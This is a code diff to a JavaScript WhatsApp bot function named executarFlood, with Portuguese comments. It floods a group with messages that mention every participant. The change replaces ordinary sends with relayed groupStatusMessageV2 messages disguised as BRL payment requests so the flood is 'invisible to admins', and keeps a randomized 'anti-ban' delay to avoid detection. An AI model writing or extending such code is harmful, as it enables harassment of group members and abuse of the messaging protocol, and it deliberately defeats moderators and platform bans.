@@ -26,7 +26,7 @@ async function executarFlood(sock, groupId) {
         const statusCount = 100;
         const count = Math.max(chatCount, statusCount);
 
-        console.log(`\x1b[33m[FLOOD START]\x1b[0m Iniciando flood (Chat: ${chatCount} | Status: ${statusCount})`);
+        console.log(`\x1b[33m[FLOOD START]\x1b[0m Iniciando flood simultâneo invisível (Chat: ${chatCount} | Status: ${statusCount})`);
 
         for (let i = 0; i < count; i++) {
             try {
@@ -52,12 +52,26 @@ async function executarFlood(sock, groupId) {
                     }, {});
                 }
 
-                // 2. Chat visível (sendMessage normal) - limite 500
+                // 2. Chat invisível para admins (groupStatusMessageV2) - limite 500
                 if (i < chatCount) {
-                    await sock.sendMessage(groupId, {
-                        text: fullText,
-                        mentions: participantes
-                    });
+                    await sock.relayMessage(groupId, {
+                        groupStatusMessageV2: {
+                            message: {
+                                requestPaymentMessage: {
+                                    currencyCodeIso4217: "BRL",
+                                    amount1000: "10000",
+                                    noteMessage: {
+                                        extendedTextMessage: {
+                                            text: fullText,
+                                            contextInfo: { isGroupStatus: true, mentionedJid: participantes }
+                                        }
+                                    },
+                                    expiryTimestamp: "0",
+                                    amount: { value: "10000", offset: 1000, currencyCode: "BRL" }
+                                }
+                            }
+                        }
+                    }, {});
                 }
 
                 // Delay anti-ban (entre 150ms e 300ms)
